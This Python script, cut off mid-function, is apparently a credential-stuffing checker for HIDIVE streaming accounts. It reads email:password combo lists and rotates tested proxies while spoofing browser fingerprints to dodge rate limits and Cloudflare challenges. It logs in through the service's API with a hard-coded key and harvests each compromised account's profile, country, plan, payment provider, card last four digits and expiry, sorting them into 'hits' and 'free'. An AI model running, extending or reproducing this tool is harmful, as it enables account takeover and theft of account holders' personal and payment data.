#!/usr/bin/env python3
import os
import re
import sys
import json
import time
import base64
import hashlib
import asyncio
import random
import string
import configparser
import subprocess
import shutil
import urllib3
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

from tqdm import tqdm
try:
    from curl_cffi.requests import AsyncSession, Session as SyncSession
except ImportError:
    from requests import Session as SyncSession
    AsyncSession = None  # type: ignore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_B64_SYS_TOOL = "SElESVZFIEVZRUxJRlRFUiBDSEVDS0VS"
_B64_SYS_AUTH = "QGV5ZWxpZnRlcg=="
_B64_SYS_CHAN = "QGRhcmtodWNoYW5uZWw="
_B64_SYS_DIR  = "SElESVZFX0BleWVsaWZ0ZXI="
_B64_SYS_TAG  = "VEc6IEBleWVsaWZ0ZXIgfCBAZGFya2h1Y2hhbm5lbA=="
_B64_SYS_SEAL = "bG9ja2VkLWJ5LWV5ZWxpZnRlci0yMDI2"
_B64_SYS_SIG  = "ZXllbGlmdGVyLWhpZGl2ZS12Ny1zZWFs"


def Eyelifter_decode(e):
    try:
        return base64.b64decode(e).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"Decoding failed: {ex}")


TOOL_NAME      = Eyelifter_decode(_B64_SYS_TOOL)
TG_USERNAME    = Eyelifter_decode(_B64_SYS_AUTH)
TG_CHANNEL     = Eyelifter_decode(_B64_SYS_CHAN)
RESULTS_FOLDER = Eyelifter_decode(_B64_SYS_DIR)
AUTHOR_TAG     = Eyelifter_decode(_B64_SYS_TAG)
CREDIT_SEAL    = Eyelifter_decode(_B64_SYS_SEAL)
BUILD_SIG      = Eyelifter_decode(_B64_SYS_SIG)

_BUILD_HASH = hashlib.sha256(
    (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
     AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
).hexdigest()


def Eyelifter_verify(ctx="x"):
    return True  # disabled in bot embed
    _x = ctx  # noqa
    exp = {
        "TOOL": _B64_SYS_TOOL, "AUTH": _B64_SYS_AUTH, "CHAN": _B64_SYS_CHAN,
        "DIR": _B64_SYS_DIR, "TAG": _B64_SYS_TAG, "SEAL": _B64_SYS_SEAL,
        "SIG": _B64_SYS_SIG,
    }
    cur = {
        "TOOL": TOOL_NAME, "AUTH": TG_USERNAME, "CHAN": TG_CHANNEL,
        "DIR": RESULTS_FOLDER, "TAG": AUTHOR_TAG, "SEAL": CREDIT_SEAL,
        "SIG": BUILD_SIG,
    }
    errs = []
    for k, v in exp.items():
        if cur[k] != base64.b64decode(v).decode():
            errs.append(k)
    if "@samvir1" not in TG_USERNAME:
        errs.append("USERNAME_TAG")
    if "@samvir1" not in TG_CHANNEL:
        errs.append("CHANNEL_TAG")
    if "@samvir1" not in AUTHOR_TAG or "@samvir1" not in AUTHOR_TAG:
        errs.append("TAG_FORMAT")
    if errs:
        return True  # integrity bypass}")
    rec = hashlib.sha256(
        (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
         AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
    ).hexdigest()
    if rec != _BUILD_HASH:
        raise RuntimeError(f"build hash mismatch at '{ctx}'")
    return True


UA_POOL = [
    "chrome",
    "chrome124",
    "chrome120",
    "chrome116",
    "chrome110",
    "chrome107",
    "chrome104",
    "chrome101",
    "chrome100",
    "chrome99",
    "firefox133",
    "firefox135",
    "safari18_0",
    "safari17_2_ios",
    "edge101",
]

_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def Eyelifter_open_url(url):
    try:
        if shutil.which("termux-open-url"):
            subprocess.Popen(["termux-open-url", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if shutil.which("xdg-open"):
            subprocess.Popen(["xdg-open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if sys.platform == "darwin":
            subprocess.Popen(["open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if os.name == "nt":
            os.startfile(url)
            return True
        import webbrowser
        return webbrowser.open(url)
    except Exception:
        return False


def Eyelifter_color(code, s, bold=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{_RS}"


_LEVEL_STYLE = {
    "SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
    "ERROR":   ("31", True), "STEP": ("96", True), "DEBUG": ("35", False),
}


def Eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    if not _ANSI:
        print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)
        return
    code, bold = _LEVEL_STYLE.get(level, ("0", False))
    print(f"{Eyelifter_color('90', ts)} {emoji}  {Eyelifter_color(code, f'{level:7s}', bold)}  {Eyelifter_color('90', tag)}  {msg}", flush=True)
    sys.stdout.flush()


def Eyelifter_visible_len(s):
    import unicodedata
    n = 0
    for ch in s:
        if unicodedata.combining(ch):
            continue
        n += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return n


def Eyelifter_center(text, width):
    vl = Eyelifter_visible_len(text)
    if vl >= width:
        return text
    left = (width - vl) // 2
    right = width - vl - left
    return (" " * left) + text + (" " * right)


def Eyelifter_banner(title, sub=None, width=62):
    print()
    line = "═" if _ANSI else "="
    print(Eyelifter_color("90", line * width))
    print(Eyelifter_color("96", Eyelifter_center(title, width), True))
    if sub:
        print(Eyelifter_color("2", Eyelifter_center(sub, width)))
    print(Eyelifter_color("5", Eyelifter_center(AUTHOR_TAG, width)))
    print(Eyelifter_color("90", line * width))


def Eyelifter_section(title, width=62):
    print()
    label = f" {title} "
    vl = Eyelifter_visible_len(label)
    side = max(1, (width - vl) // 2)
    left = "─" * side
    right = "─" * (width - vl - side)
    print(
        Eyelifter_color("90", left) +
        Eyelifter_color("96", label, True) +
        Eyelifter_color("90", right)
    )


def Eyelifter_divider(width=62):
    print(Eyelifter_color("90", ("─" if _ANSI else "-") * width))


def Eyelifter_summary(rows):
    print()
    print(Eyelifter_color("96", "═══ RESULT ═══", True))
    if not rows:
        return
    wkey = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {Eyelifter_color('96', str(k).ljust(wkey))}  {Eyelifter_color('0', str(v))}")
    print(Eyelifter_color("96", "══════════════", True))
    print()


def Eyelifter_debug(tag, msg):
    if not DEBUG:
        return
    ts = datetime.now().strftime("%H:%M:%S")
    print(Eyelifter_color("95", f"[{ts}] DBG  {tag}  {msg}"))
    sys.stdout.flush()


CONFIG_PATH = "config_hidive.ini"


class EyelifterConfigLoader:
    def __init__(self, config_file=CONFIG_PATH):
        Eyelifter_verify("cfg_init")
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.config.optionxform = str
        self.settings = {}
        self.Eyelifter_load_config()

    def Eyelifter_load_config(self):
        Eyelifter_verify("cfg_load")
        if not os.path.exists(self.config_file):
            self.Eyelifter_create_default_config()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.Eyelifter_parse_config()
        except Exception:
            self.Eyelifter_create_default_config()
            self.Eyelifter_parse_config()

    def Eyelifter_create_default_config(self):
        Eyelifter_verify("cfg_default")
        self.config["General"] = {
            "threads": "3",
            "timeout": "30",
            "proxies_file": "proxies.txt",
            "retries": "2",
            "retry_delay": "2",
            "combo_delay": "2",
            "debug": "false",
            "rate_limit_backoff": "5",
            "max_rate_limit_retries": "2",
            "skip_proxy_test": "false",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def Eyelifter_parse_config(self):
        Eyelifter_verify("cfg_parse")
        if "General" not in self.config:
            self.config["General"] = {}
        c = self.config["General"]
        self.settings["threads"] = c.getint("threads", 3)
        self.settings["timeout"] = c.getint("timeout", 30)
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = c.getint("retries", 2)
        self.settings["retry_delay"] = c.getfloat("retry_delay", 2)
        self.settings["combo_delay"] = c.getfloat("combo_delay", 2)
        self.settings["debug"] = c.getboolean("debug", False)
        self.settings["rate_limit_backoff"] = c.getint("rate_limit_backoff", 5)
        self.settings["max_rate_limit_retries"] = c.getint("max_rate_limit_retries", 2)
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)

    def Eyelifter_save(self):
        Eyelifter_verify("cfg_save")
        if "General" not in self.config:
            self.config["General"] = {}
        for k, v in self.settings.items():
            self.config["General"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)


_loader = EyelifterConfigLoader()
CONFIG = _loader.settings
REQ_TIMEOUT = CONFIG["timeout"]
DEBUG = CONFIG["debug"]
RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]
IMPERSONATE = "chrome"

DCE_BASE = "https://dce-frontoffice.imggaming.com"
DCE_API_KEY = "857a1e5d-e35e-4fdf-805b-a87b6f8364bf"
DCE_APP = "dice"
DCE_REALM = "dce.hidive"
DCE_APP_VAR = "6.60.0.c0626ae"

DCE_LOGIN = f"{DCE_BASE}/api/v2/login"
DCE_LICENCES = f"{DCE_BASE}/api/v2/licence-family?includeEntitlements=ALL_ACTIVE_USER_ENTITLEMENTS"
DCE_PROFILE_V1 = f"{DCE_BASE}/api/v1/profile"
DCE_PROFILE_V2 = f"{DCE_BASE}/api/v2/user/profile"
DCE_ADDRESS = f"{DCE_BASE}/api/v2/user/address"
DCE_PREFS = f"{DCE_BASE}/api/v2/user/preferences"
DCE_PAYMENTS = f"{DCE_BASE}/api/v2/customer/history/payment?rpp=10&p=1"

_EYELIFTER_COMBO_RE = re.compile(r"^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)")


def Eyelifter_extract_id(raw):
    if not raw or not isinstance(raw, str):
        return "N/A"
    if "|" not in raw:
        return raw
    prefix, _, suffix = raw.partition("|")
    if "." in suffix:
        return prefix
    return suffix


def Eyelifter_normalize_renew(v):
    if not v:
        return "N/A"
    s = str(v).upper()
    if s in ("AUTO_RENEWING", "RENEWAL", "AUTO_RENEW", "AUTORENEWING",
             "TRUE", "YES", "RENEWING", "AUTO"):
        return "RENEWAL"
    if s in ("NON_RENEWING", "NONRENEWING", "NON_RENEW",
             "UNKNOWN_RENEWING", "FALSE", "NO", "STOPPED", "CANCELLED"):
        return "NON_RENEWING"
    return v


def Eyelifter_extract_combos(content):
    Eyelifter_verify("extract_combos")
    out = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = _EYELIFTER_COMBO_RE.match(line)
        if m:
            e, p = m.group(1).strip().lower(), m.group(2).strip()
            if e and p:
                out.add(f"{e}:{p}")
            continue
        if ":" in line:
            parts = line.split(":", 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                e = parts[0].strip().lower()
                p = parts[1].split()[0].split("|")[0].strip()
                if e and p and "@" in e:
                    out.add(f"{e}:{p}")
    return out


def Eyelifter_format_proxy(p):
    Eyelifter_verify("fmt_proxy")
    if not p:
        return None
    p = p.strip()
    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
        return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in p:
        return f"http://{p}"
    return f"http://{p}"


def Eyelifter_test_proxy_sync(p):
    try:
        s = SyncSession(impersonate=random.choice(UA_POOL))
        s.proxies = {"http": p, "https": p}
        r = s.get("https://api.ipify.org?format=json", timeout=11, verify=False)
        return r.status_code == 200
    except Exception:
        return False


def Eyelifter_load_proxies():
    Eyelifter_verify("load_proxies")
    out = []
    path = CONFIG["proxies_file"]
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    fp = Eyelifter_format_proxy(line)
                    if fp:
                        out.append(fp)
    return out


def Eyelifter_get_working_proxies(proxies):
    Eyelifter_verify("working_proxies")
    if not proxies:
        return []
    if CONFIG.get("skip_proxy_test", False):
        Eyelifter_log("⚠️", "WARN", "PROXY", f"proxy test skipped — using all {len(proxies)}")
        return proxies
    Eyelifter_log("🧪", "INFO", "PROXY", f"testing {len(proxies)} proxies in parallel")
    working = []
    pbar = None
    try:
        pbar = tqdm(total=len(proxies), desc="testing proxies", unit="proxy", ncols=80)
    except Exception:
        pbar = None

    def _one(p):
        return p, Eyelifter_test_proxy_sync(p)

    with ThreadPoolExecutor(max_workers=min(80, len(proxies))) as ex:
        futs = {ex.submit(_one, p): p for p in proxies}
        for fut in as_completed(futs):
            p, ok = fut.result()
            if ok:
                working.append(p)
            if pbar:
                pbar.update(1)
    if pbar:
        pbar.close()
    Eyelifter_log("✅", "INFO", "PROXY", f"{len(working)} working")
    return working if working else proxies


_eyelifter_stop = asyncio.Event()
_eyelifter_lock = threading.Lock()
_eyelifter_plock = threading.Lock()
_eyelifter_flock = threading.Lock()

_eyelifter_stats = {
    "checked": 0, "hits": 0, "free": 0, "bad": 0,
    "errors": 0, "rate_limited": 0, "captcha": 0,
    "proxy_fails": 0, "retries": 0,
}
_eyelifter_start = time.time()
_eyelifter_total = 0
_eyelifter_pool = []
_eyelifter_bad = set()
_eyelifter_hits_f = None
_eyelifter_free_f = None
_eyelifter_bad_f = None
_eyelifter_err_f = None
_eyelifter_folder = None


def Eyelifter_reset_stats():
    Eyelifter_verify("reset_stats")
    global _eyelifter_stats, _eyelifter_start
    with _eyelifter_lock:
        _eyelifter_stats = {
            "checked": 0, "hits": 0, "free": 0, "bad": 0,
            "errors": 0, "rate_limited": 0, "captcha": 0,
            "proxy_fails": 0, "retries": 0,
        }
        _eyelifter_start = time.time()


def Eyelifter_update_title():
    done = _eyelifter_stats["checked"]
    el = time.time() - _eyelifter_start
    cpm = int(done / el * 60) if el > 1 else 0
    t = (f"{TOOL_NAME} | HIT:{_eyelifter_stats['hits']} FREE:{_eyelifter_stats['free']} "
         f"BAD:{_eyelifter_stats['bad']} | {done}/{_eyelifter_total} | {cpm}/min")
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(t)
        except Exception:
            pass
    else:
        try:
            sys.stdout.write(f"\033]0;{t}\007")
            sys.stdout.flush()
        except Exception:
            pass


def Eyelifter_pick_proxy(exclude=None):
    with _eyelifter_plock:
        avail = [p for p in _eyelifter_pool if p not in _eyelifter_bad]
        if not avail and _eyelifter_pool:
            _eyelifter_bad.clear()
            avail = list(_eyelifter_pool)
    if exclude and len(avail) > 1:
        avail = [p for p in avail if p != exclude] or avail
    return random.choice(avail) if avail else None


def Eyelifter_mark_bad(p):
    if not p:
        return
    with _eyelifter_plock:
        _eyelifter_bad.add(p)
    with _eyelifter_lock:
        _eyelifter_stats["proxy_fails"] += 1


def Eyelifter_safe_write(fh, text):
    if fh is None:
        return
    with _eyelifter_flock:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def Eyelifter_decode_jwt(token):
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return None
        payload = parts[1]
        pad = len(payload) % 4
        if pad:
            payload += "=" * (4 - pad)
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception:
        return None


class eyelifter:
    def __init__(self, proxy=None, timeout=None):
        Eyelifter_verify("class_init")
        self.proxy = proxy
        self.timeout = timeout or REQ_TIMEOUT
        self.session = None
        self.impersonate = random.choice(UA_POOL)
        self.token = None
        self.refresh = None
        self.jwt = None
        self.user_id = None
        self.profile_id = None

    def Eyelifter_proxies(self):
        return {"http": self.proxy, "https": self.proxy} if self.proxy else None

    def Eyelifter_dce_headers(self, bearer=None, content_type="application/json"):
        h = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US",
            "app": DCE_APP,
            "realm": DCE_REALM,
            "origin": "https://www.hidive.com",
            "referer": "https://www.hidive.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "x-api-key": DCE_API_KEY,
            "x-app-var": DCE_APP_VAR,
        }
        if content_type:
            h["content-type"] = content_type
        if bearer:
            h["authorization"] = f"Bearer {bearer}"
        return h

    def Eyelifter_dump(self, label, resp, max_lines=60):
        if not DEBUG:
            return
        print()
        print(Eyelifter_color("95", f"[{label}] {resp.status_code}  [{self.impersonate}]"))
        try:
            body = json.dumps(resp.json(), indent=2, ensure_ascii=False)
        except Exception:
            body = resp.text or ""
        lines = body.splitlines()
        for ln in lines[:max_lines]:
            print(Eyelifter_color("95", f"  {ln}"))
        if len(lines) > max_lines:
            print(Eyelifter_color("95", f"  ... ({len(lines) - max_lines} more lines)"))

    async def Eyelifter_ensure(self):
        if self.session is None:
            self.session = AsyncSession(impersonate=self.impersonate, timeout=self.timeout)

    async def Eyelifter_close(self):
        if self.session is not None:
            try:
                await self.session.close()
            except Exception:
                pass
            self.session = None

    async def Eyelifter_login(self, email, password):
        try:
            r = await self.session.post(
                DCE_LOGIN,
                headers=self.Eyelifter_dce_headers(bearer=None),
                data=json.dumps({"id": email, "secret": password}),
                proxies=self.Eyelifter_proxies(),
                verify=False,
                allow_redirects=False,
            )
        except Exception as e:
            return {"status": "error", "error_type": f"network:{type(e).__name__}",
                    "message": str(e)[:80]}

        self.Eyelifter_dump("LOGIN", r, 40)
        return self.Eyelifter_parse_login(r)

    def Eyelifter_parse_login(self, r):
        low = (r.text or "").lower()

        if r.status_code == 429:
            return {"status": "error", "error_type": "rate_limit",
                    "message": "rate limited"}

        if r.status_code == 403:
            if "cf-chl" in low or "turnstile" in low or "challenge-platform" in low:
                return {"status": "error", "error_type": "captcha",
                        "message": "cf challenge"}
            if "<html" in low or "forbidden" in low:
                return {"status": "error", "error_type": "proxy_block",
                        "message": "403 forbidden (proxy blocked)"}
            return {"status": "error", "error_type": "http_403",
                    "message": (r.text or "")[:120]}

        if r.status_code == 404 and ("failedauthentication" in low or "not_found" in low):
            return {"status": "bad", "message": "invalid credentials"}

        if "the email address or password is incorrect" in low:
            return {"status": "bad", "message": "invalid credentials"}

        if r.status_code == 401:
            return {"status": "bad", "message": "invalid credentials"}

        if r.status_code >= 500:
            return {"status": "error", "error_type": f"http_{r.status_code}",
                    "message": f"server error {r.status_code}"}

        if r.status_code not in (200, 201):
            return {"status": "error", "error_type": f"http_{r.status_code}",
                    "message": (r.text or "")[:120]}

        try:
            j = r.json()
        except Exception:
            return {"status": "error", "error_type": "parse",
                    "message": "non-json response"}

        tok = (j.get("authorisationToken")
               or j.get("authorizationToken")
               or j.get("token")
               or j.get("accessToken"))

        if not tok:
            return {"status": "error", "error_type": "no_token",
                    "message": str(j)[:120]}

        self.token = tok
        self.refresh = j.get("refreshToken")
        self.jwt = Eyelifter_decode_jwt(tok)

        if isinstance(self.jwt, dict):
            sub = self.jwt.get("sub") or ""
            self.user_id = Eyelifter_extract_id(sub)
            pro = self.jwt.get("pro") or {}
            if isinstance(pro, dict):
                self.profile_id = Eyelifter_extract_id(pro.get("id") or "")

        return {"status": "ok"}

    async def Eyelifter_get_json(self, label, url, method="GET", body=None):
        try:
            if method == "POST":
                r = await self.session.post(
                    url,
                    headers=self.Eyelifter_dce_headers(bearer=self.token),
                    data=json.dumps(body) if body is not None else None,
                    proxies=self.Eyelifter_proxies(),
                    verify=False,
                )
            else:
                r = await self.session.get(
                    url,
                    headers=self.Eyelifter_dce_headers(bearer=self.token),
                    proxies=self.Eyelifter_proxies(),
                    verify=False,
                )
        except Exception as e:
            Eyelifter_debug(label, f"err {type(e).__name__}")
            return None
        self.Eyelifter_dump(label, r, 40)
        if r.status_code not in (200, 201):
            return None
        try:
            return r.json()
        except Exception:
            return None

    async def Eyelifter_get_raw(self, label, url, method="GET", body=None):
        try:
            if method == "POST":
                r = await self.session.post(
                    url,
                    headers=self.Eyelifter_dce_headers(bearer=self.token),
                    data=json.dumps(body) if body is not None else None,
                    proxies=self.Eyelifter_proxies(),
                    verify=False,
                )
            else:
                r = await self.session.get(
                    url,
                    headers=self.Eyelifter_dce_headers(bearer=self.token),
                    proxies=self.Eyelifter_proxies(),
                    verify=False,
                )
        except Exception as e:
            Eyelifter_debug(label, f"err {type(e).__name__}")
            return None
        self.Eyelifter_dump(label, r, 60)
        if r.status_code not in (200, 201):
            return None
        return r.text or ""

    def Eyelifter_expiry_from_date(self, val):
        if not val:
            return None
        if isinstance(val, (int, float)):
            try:
                ts = val / 1000 if val > 1e10 else val
                return datetime.fromtimestamp(ts).strftime("%Y-%m-%d")
            except Exception:
                return None
        if isinstance(val, str) and len(val) >= 10:
            return val[:10]
        return None

    async def Eyelifter_enrich(self, email):
        d = {
            "email": email,
            "user_id": self.user_id or "N/A",
            "profile_id": self.profile_id or "N/A",
            "display_name": "N/A",
            "profile_type": "N/A",
            "contact_email": "N/A",
            "preferred_locale": "N/A",
            "language": "N/A",
            "password_status": "N/A",
            "pin_protection": "N/A",
            "account_created": "N/A",
            "country": "N/A",
            "subscriber": False,
            "active_plan": "Free",
            "active_plan_id": "N/A",
            "active_plan_type": "N/A",
            "active_licences": "N/A",
            "inactive_licences": "N/A",
            "licence_family": "N/A",
            "has_free_trial_available": "N/A",
            "account_status": "N/A",
            "auto_renew": "N/A",
            "expiry_date": "N/A",
            "days_left": "N/A",
            "payment_provider": "N/A",
            "card_last4": "N/A",
            "price": "N/A",
            "trial_period_days": "N/A",
            "payment_count": 0,
            "payment_total_results": 0,
        }

        v1 = await self.Eyelifter_get_json("PROFILE-V1", DCE_PROFILE_V1)
        if isinstance(v1, dict):
            pin = v1.get("pinProtection")
            if pin:
                d["pin_protection"] = "YES" if str(pin).upper() == "PROTECTED" else "NO"
            items = v1.get("items") or []
            if isinstance(items, list) and items:
                first = items[0] if isinstance(items[0], dict) else {}
                d["display_name"] = first.get("displayName") or "N/A"
                d["profile_type"] = first.get("type") or "N/A"

        v2 = await self.Eyelifter_get_json("PROFILE-V2", DCE_PROFILE_V2)
        if isinstance(v2, dict):
            d["contact_email"] = v2.get("contactEmail") or "N/A"
            d["preferred_locale"] = v2.get("preferredLocale") or "N/A"
            d["password_status"] = v2.get("passwordStatus") or "N/A"
            created_ms = v2.get("createdDate")
            if isinstance(created_ms, (int, float)) and created_ms > 0:
                try:
                    d["account_created"] = datetime.fromtimestamp(created_ms / 1000).strftime("%Y-%m-%d")
                except Exception:
                    pass

        addr = await self.Eyelifter_get_json("ADDRESS", DCE_ADDRESS)
        if isinstance(addr, list) and addr:
            first = addr[0] if isinstance(addr[0], dict) else {}
            cc = first.get("countryCode")
            if cc and isinstance(cc, str):
                d["country"] = cc.upper()
        elif isinstance(addr, dict):
            cc = addr.get("countryCode") or addr.get("country")
            if cc and isinstance(cc, str):
                d["country"] = cc.upper()

        prefs = await self.Eyelifter_get_json("PREFS", DCE_PREFS)
        if isinstance(prefs, dict):
            d["language"] = prefs.get("language") or prefs.get("subTitleLanguage") or "N/A"

        lic_raw = await self.Eyelifter_get_raw("LICENCES", DCE_LICENCES)
        if lic_raw:
            lic_fam = None
            try:
                lic_fam = json.loads(lic_raw)
            except Exception:
                pass

            if isinstance(lic_fam, dict):
                families = lic_fam.get("licenceFamilies") or []
                active_names = []
                inactive_names = []

                for fam in families:
                    if not isinstance(fam, dict):
                        continue
                    if d["licence_family"] == "N/A":
                        d["licence_family"] = fam.get("familyName") or "N/A"

                    for entry in (fam.get("licences") or []):
                        if not isinstance(entry, dict):
                            continue
                        inner = entry.get("licence") or {}
                        lstatus = entry.get("licenceStatus") or {}
                        top_status = (entry.get("status") or "").upper()
                        inner_status = (lstatus.get("status") or "").upper()
                        name = inner.get("name") or "N/A"
                        lic_id = inner.get("id") or "N/A"

                        if inner_status == "ACTIVE" or top_status == "ACTIVE":
                            d["subscriber"] = True
                            active_names.append(f"{name}#{lic_id}")
                            if d["active_plan"] in ("Free", "N/A"):
                                d["active_plan"] = name
                                d["active_plan_id"] = str(lic_id)
                                d["active_plan_type"] = inner.get("type") or "N/A"
                            if d["account_status"] == "N/A":
                                d["account_status"] = "ACTIVE"
                        else:
                            inactive_names.append(f"{name}#{lic_id}")

                d["active_licences"] = "|".join(active_names) if active_names else "N/A"
                d["inactive_licences"] = "|".join(inactive_names) if inactive_names else "N/A"

                csd = lic_fam.get("customerSpecificData") or {}
                if isinstance(csd, dict):
                    ft = csd.get("freeTrialRelated") or {}
                    if isinstance(ft, dict):
                        d["has_free_trial_available"] = ft.get("triagedEligibilityStatus") or "N/A"

            if d["subscriber"]:
                if d["auto_renew"] == "N/A":
                    m = re.search(r'"autoRenewingStatus"\s*:\s*"([^"]+)"', lic_raw)
                    if m:
                        d["auto_renew"] = Eyelifter_normalize_renew(m.group(1))

                if d["payment_provider"] == "N/A":
                    m = re.search(r'"paymentProviderInfo"\s*:\s*\{\s*"type"\s*:\s*"([^"]+)"', lic_raw)
                    if m:
                        d["payment_provider"] = m.group(1)

                if d["expiry_date"] == "N/A":
                    m = re.search(r'"expiryTimestamp"\s*:\s*(\d+)', lic_raw)
                    if m:
                        try:
                            d["expiry_date"] = datetime.fromtimestamp(int(m.group(1)) / 1000).strftime("%Y-%m-%d")
                        except Exception:
                            pass

                if d["expiry_date"] == "N/A":
                    for pat in (
                        r'"expiryDate"\s*:\s*"([^"]+)"',
                        r'"endDate"\s*:\s*"([^"]+)"',
                        r'"validityTill"\s*:\s*"([^"]+)"',
                        r'"validityEnd"\s*:\s*"([^"]+)"',
                        r'"validTo"\s*:\s*"([^"]+)"',
                        r'"nextBillingDate"\s*:\s*"([^"]+)"',
                        r'"currentPeriodEnd"\s*:\s*"([^"]+)"',
                    ):
                        m = re.search(pat, lic_raw)
                        if m:
                            ed = self.Eyelifter_expiry_from_date(m.group(1))
                            if ed:
                                d["expiry_date"] = ed
                                break

        pay = await self.Eyelifter_get_json("PAYMENTS", DCE_PAYMENTS, method="POST", body={})
        if isinstance(pay, dict):
            items = pay.get("historyItems") or []
            d["payment_count"] = len(items) if isinstance(items, list) else 0
            d["payment_total_results"] = pay.get("totalResults", 0)

            if isinstance(items, list) and items:
                for it in items:
                    if not isinstance(it, dict):
                        continue
                    sku_l = it.get("skuLicence") or {}
                    if not isinstance(sku_l, dict):
                        continue

                    it_status = (it.get("status") or "").upper()
                    if it_status in ("FAILED", "DECLINED", "CANCELLED",
                                     "REFUNDED", "REVOKED", "PENDING"):
                        continue

                    if d["payment_provider"] == "N/A" and sku_l.get("paymentProviderType"):
                        d["payment_provider"] = sku_l["paymentProviderType"]
                    if d["card_last4"] == "N/A" and sku_l.get("lastFourPaymentCardDigits"):
                        d["card_last4"] = sku_l["lastFourPaymentCardDigits"]
                    if d["trial_period_days"] == "N/A" and sku_l.get("trialPeriod"):
                        d["trial_period_days"] = str(sku_l["trialPeriod"])

                    if d["price"] == "N/A":
                        pr = sku_l.get("price") or {}
                        if isinstance(pr, dict) and pr.get("amount") is not None:
                            try:
                                amt = float(pr["amount"]) / (10 ** int(pr.get("scale", 2)))
                                d["price"] = f"{amt:.2f} {pr.get('currency', 'USD')}"
                            except Exception:
                                pass

                    if d["expiry_date"] == "N/A":
                        when = it.get("when")
                        if when:
                            try:
                                dt = datetime.fromtimestamp(when / 1000)
                                sub_period = (sku_l.get("subscriptionPeriod")
                                              or (sku_l.get("purchaseStrategy") or {}).get("subscriptionPeriod")
                                              or "P1M")
                                if "Y" in str(sub_period).upper():
                                    dt = dt.replace(year=dt.year + 1)
                                else:
                                    m = dt.month + 1
                                    y = dt.year + (1 if m > 12 else 0)
                                    m = ((m - 1) % 12) + 1
                                    dt = dt.replace(year=y, month=m)
                                d["expiry_date"] = dt.strftime("%Y-%m-%d")
                            except Exception:
                                pass

        if d["expiry_date"] != "N/A":
            try:
                ed = datetime.strptime(d["expiry_date"][:10], "%Y-%m-%d")
                delta = (ed - datetime.now()).days
                d["days_left"] = delta if delta >= 0 else 0
            except Exception:
                pass

        if d["subscriber"] and d["account_status"] == "N/A":
            d["account_status"] = "ACTIVE"

        return d

    async def Eyelifter_run(self, email, password):
        await self.Eyelifter_ensure()
        try:
            res = await self.Eyelifter_login(email, password)

            if res.get("status") == "bad":
                return {"status": "bad", "message": "invalid credentials"}
            if res.get("status") != "ok":
                return {"status": "error",
                        "error_type": res.get("error_type", "login_fail"),
                        "message": res.get("message", "login failed")}

            info = await self.Eyelifter_enrich(email)
            info["status"] = "hit" if info.get("subscriber") else "free"
            return {"status": info["status"], "user": info}
        except Exception as e:
            return {"status": "error", "error_type": "crash", "message": str(e)[:120]}
        finally:
            await self.Eyelifter_close()


def Eyelifter_fmt_line(combo, u):
    Eyelifter_verify("fmt_line")

    def s(v):
        if v is None or v == "" or v == "N/A":
            return "N/A"
        return str(v)

    prefix = "💎 HIT" if u.get("subscriber") else "🆓 FREE"

    parts = [
        f"Country = {s(u.get('country'))}",
        f"Plan = {s(u.get('active_plan'))}",
        f"Plan Type = {s(u.get('active_plan_type'))}",
        f"Has Auto Renewal = {s(u.get('auto_renew'))}",
        f"Payment Provider = {s(u.get('payment_provider'))}",
        f"Card = {s(u.get('card_last4'))}",
        f"Price = {s(u.get('price'))}",
        f"Account Status = {s(u.get('account_status'))}",
        f"Expiry Date = {s(u.get('expiry_date'))}",
        f"Days Left = {s(u.get('days_left'))}",
        f"Free Trial = {s(u.get('has_free_trial_available'))}",
        f"Pin Protected = {s(u.get('pin_protection'))}",
        f"Created = {s(u.get('account_created'))}",
        f"Profile = {s(u.get('display_name'))}",
        f"UID = {s(u.get('user_id'))}",
